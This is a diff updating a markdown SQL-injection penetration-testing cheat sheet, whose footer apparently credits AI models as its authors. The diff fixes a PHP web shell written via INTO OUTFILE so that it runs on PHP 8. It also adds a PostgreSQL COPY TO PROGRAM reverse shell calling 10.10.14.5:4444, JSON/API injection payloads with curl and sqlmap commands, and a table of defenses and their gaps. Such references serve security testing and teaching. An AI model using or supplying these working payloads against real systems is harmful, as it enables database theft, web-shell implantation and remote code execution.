@@ -24,10 +24,10 @@ SQL injection occurs when unsanitized user input is inserted directly into a SQL
 
 | Tool | Purpose |
 |---|---|
-| `sqlmap` | Automated SQLi detection and exploitation |
-| `ghauri` | Modern sqlmap alternative — faster, cleaner output |
-| `Burp Suite` | Manual testing + Repeater for blind injection |
-| `sqlmap --tamper` | WAF bypass scripts (space2comment, randomcase, etc.) |
+| [[Tools/Database/SQLMap\|sqlmap]] | Automated SQLi detection and exploitation; `--tamper` for WAF bypass |
+| [[Tools/Database/ghauri\|ghauri]] | Lighter sqlmap alternative — fewer requests, less noisy |
+| [[Tools/Web/Burpsuite\|Burp Suite]] | Manual testing + Repeater for blind injection; Collaborator for OOB |
+| `interactsh-client` | Self-hosted OOB callback listener — [repo](https://github.com/projectdiscovery/interactsh) |
 
 ---
 
@@ -223,9 +223,13 @@ SHOW DATABASES;
 ' UNION SELECT NULL,LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf'),NULL-- -
 ' UNION SELECT NULL,LOAD_FILE('/etc/nginx/sites-enabled/default'),NULL-- -
 
--- Write shell
-' UNION SELECT NULL,'<?php system($_GET[cmd]); ?>',NULL INTO OUTFILE '/var/www/html/cmd.php'-- -
+-- Write shell — note the NUMERIC key, not a bare word
+' UNION SELECT NULL,'<?php system($_REQUEST[0]); ?>',NULL INTO OUTFILE '/var/www/html/cmd.php'-- -
+-- Then: http://target.com/cmd.php?0=id
 ```
+
+> [!warning]
+> Don't write `$_GET[cmd]` with a bare, unquoted key. PHP 7.2 deprecated the undefined-constant fallback and **PHP 8.0 made it a fatal `Error`** — the shell dies on every request. You usually can't use `'cmd'` either, since the quotes collide with the SQL string delimiter. A numeric key (`$_REQUEST[0]`) sidesteps both; alternatively hex-encode the whole payload and use `INTO DUMPFILE 0x...`.
 
 ### MSSQL → xp_cmdshell
 
@@ -245,9 +249,17 @@ SELECT value FROM sys.configurations WHERE name='xp_cmdshell'
 ### PostgreSQL → COPY FROM PROGRAM (RCE)
 
 ```sql
+-- COPY FROM needs an EXISTING table — create it first or the statement errors
+CREATE TABLE cmd_output(line text);
 COPY cmd_output FROM PROGRAM 'id';
-'; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.14.x/4444 0>&1"'-- -
+SELECT * FROM cmd_output;
+
+-- Reverse shell needs no table (COPY ... TO PROGRAM)
+'; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"'-- -
 ```
+
+> [!note]
+> Requires superuser or membership in `pg_execute_server_program` (PostgreSQL 11+). Runs as the `postgres` OS user, not root.
 
 ---
 
@@ -405,6 +417,43 @@ sqlmap -u "http://target.com/" -H "X-Forwarded-For: *" --batch
 - Different error when header contains `'`
 - Delayed response with `SLEEP(5)` in header
 - App tracks IP/UA and reflects it back somewhere
+
+---
+
+## JSON / API Body Injection
+
+Referenced in the checklist but easy to skip — REST and GraphQL backends concatenate JSON values into SQL just as often as form handlers do.
+
+```http
+POST /api/search HTTP/1.1
+Content-Type: application/json
+
+{"filter":"laptop' UNION SELECT NULL,user(),NULL-- -","limit":10}
+```
+
+```bash
+# Escape the quote for JSON validity — \" in the body, ' in the SQL
+curl -s -X POST https://target.com/api/search \
+  -H 'Content-Type: application/json' \
+  -d '{"filter":"x'"'"' OR 1=1-- -","limit":10}'
+
+# sqlmap against a JSON body — mark the point with *
+sqlmap -u "https://target.com/api/search" \
+  --data '{"filter":"*","limit":10}' \
+  --headers="Content-Type: application/json" --batch
+```
+
+Injectable spots people miss in APIs:
+
+| Location | Why it's reachable |
+|---|---|
+| Nested object values | `{"user":{"id":"1' OR 1=1-- -"}}` — flattened into a query server-side |
+| Array elements | `{"ids":["1","2' UNION..."]}` — often joined into an `IN (…)` clause |
+| Sort / order fields | `{"sort":"name; DROP…"}` — **identifiers can't be parameterised**, so these are frequently concatenated |
+| `limit` / `offset` | Numeric context, no quotes needed to break out |
+
+> [!tip]
+> `ORDER BY` and column/table names are the highest-yield API targets. Prepared statements cannot parameterise an identifier, so even a codebase that uses them everywhere else usually string-builds the sort clause.
 
 ---
 
@@ -736,6 +785,26 @@ sqlmap -u "http://target.com/page?id=1" --sql-shell
 
 ---
 
+## Prevention (Know the Defenses)
+
+What you're up against, and where each control still leaks — useful for the remediation section of a report.
+
+| Control | Stops | Residual gap |
+|---|---|---|
+| **Parameterised queries / prepared statements** | All value-context injection | **Cannot parameterise identifiers** — table/column names, `ORDER BY`, `LIMIT` in some drivers. Those stay string-built |
+| **Stored procedures** | Only if they parameterise internally | A proc that concatenates its arguments into dynamic SQL is just as injectable |
+| **ORM / query builder** | Most common cases | Raw-query escape hatches (`.raw()`, `.whereRaw()`, `@Query`) reintroduce it |
+| **Allowlist input validation** | Identifier contexts prepared statements can't cover | Only as good as the list; the right control for `ORDER BY` |
+| **Least-privilege DB account** | Doesn't stop injection — caps the blast radius | Kills `FILE`/`INTO OUTFILE`, `xp_cmdshell`, `COPY FROM PROGRAM` |
+| **`secure_file_priv` / disabled `xp_cmdshell`** | The RCE escalation path | Data extraction is untouched |
+| **WAF** | Naive payloads | Every technique in [[#Filter Bypass / WAF Evasion]] — a detection layer, not a fix |
+| **Escaping user input by hand** | Almost nothing reliably | Charset tricks, numeric context (no quotes to escape), second-order |
+
+> [!warning]
+> "We use prepared statements" is not, by itself, a valid remediation claim — always test `ORDER BY`, sort/direction parameters, and any dynamic table or column name. Those are the fields a parameterised codebase still concatenates, and they're where injection survives in otherwise-clean applications.
+
+---
+
 ## Quick Reference Checklist
 
 ```bash
@@ -793,5 +862,5 @@ sqlmap -u "http://target.com/page?id=1" --sql-shell
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-07-21*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-08-17*
+*Model: claude-opus-5*
